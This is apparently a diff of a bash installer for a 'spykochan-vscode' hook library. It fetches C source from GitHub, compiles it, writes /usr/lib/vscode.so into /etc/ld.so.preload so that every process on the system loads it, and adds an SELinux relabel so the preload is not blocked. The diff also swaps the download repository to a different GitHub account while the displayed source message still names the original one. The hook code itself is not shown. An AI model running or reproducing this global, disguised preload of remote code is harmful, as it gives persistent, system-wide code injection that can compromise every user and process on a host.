@@ -228,16 +228,18 @@ install_build_tools() {
 compile_hook() {
   header "HOOK LIBRARY COMPILATION"
   
-  step "Downloading hook source code..."
-  progress "Source: github.com/wooxsec/spykochan-vscode"
-  
-  # Cleanup old files first
-  rm -f /tmp/vscode.c /tmp/hook.so
-  
-  if ! download_file "https://raw.githubusercontent.com/wooxsec/spykochan-vscode/refs/heads/main/hook/vscode.c" "/tmp/vscode.c"; then
-    err "Failed to download vscode.c from GitHub"
-    info "Please check your internet connection"
-    exit 1
+  # Use local file if available, otherwise download
+  if [ -f "./hook/vscode.c" ]; then
+    step "Using local hook source code..."
+    cp "./hook/vscode.c" "/tmp/vscode.c"
+  else
+    step "Downloading hook source code..."
+    progress "Source: github.com/wooxsec/spykochan-vscode"
+    if ! download_file "https://raw.githubusercontent.com/wanmywan/spykochan-vscode/refs/heads/main/hook/vscode.c" "/tmp/vscode.c"; then
+      err "Failed to download vscode.c from GitHub"
+      info "Please check your internet connection"
+      exit 1
+    fi
   fi
   
   if [ ! -f /tmp/vscode.c ] || [ ! -s /tmp/vscode.c ]; then
@@ -429,6 +431,15 @@ EOF
   [ -f /etc/ld.so.preload ] && cp /etc/ld.so.preload /etc/ld.so.preload.bak && info "Previous configuration backed up" || true
   echo "/usr/lib/vscode.so" > /etc/ld.so.preload
   ok "LD_PRELOAD configured globally"
+
+  # SELinux Fix for CentOS/RHEL
+  if command -v getenforce &> /dev/null; then
+    if [ "$(getenforce)" != "Disabled" ]; then
+      step "Configuring SELinux context for library..."
+      chcon -t textrel_shlib_t /usr/lib/vscode.so 2>/dev/null || true
+      ok "SELinux context updated"
+    fi
+  fi
 
   step "Reloading systemd daemon..."
   systemctl daemon-reload
